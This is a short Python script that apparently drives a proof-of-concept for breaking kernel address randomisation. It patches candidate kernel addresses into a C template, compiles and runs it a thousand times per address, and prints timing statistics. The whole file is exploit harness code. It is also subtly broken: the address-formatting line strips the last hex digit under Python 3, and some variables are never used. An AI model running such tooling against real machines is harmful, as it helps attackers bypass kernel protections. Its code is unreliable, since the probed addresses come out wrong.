#!/usr/bin/python3

import subprocess
import statistics

#current address - ffffffffb8e00000

# also tried
# 00000000
# 0xffff8880

start = 0xffffffffb8c00000
end =   0xffffffffb9000000
step =  0x0000000000100000

threshold = 0.1

with open('poc.c') as f:
    template = f.read()

def measure_score(addr):
    test = template[:]
    test = test.replace('0xffffffffcafebabe', addr)
    #print(test)
    with open('tmp.c', 'w') as f:
      f.write(test)
    subprocess.call(['gcc', 'tmp.c'])
    p = subprocess.Popen('./a.out', shell=False, stdout=subprocess.PIPE)
    score = p.stdout.readline().strip()
    return float(score)

addrs = []

addr = start
while addr <= end:
    addrs.append(addr)
    addr += step

for addr in addrs:
    str_addr = hex(addr)[:-1]
    count = 1000
    rejected = False
    data=[]
    print()
    for i in range(count):
      score = measure_score(str_addr)
      score = int(score)
      data.append(score)
    print("address:", str_addr)
    print("Mean:", statistics.mean(data))
    print("Median:", statistics.median(data))
    print("Mode:", statistics.mode(data))
    print("Standard deviation:", statistics.stdev(data))

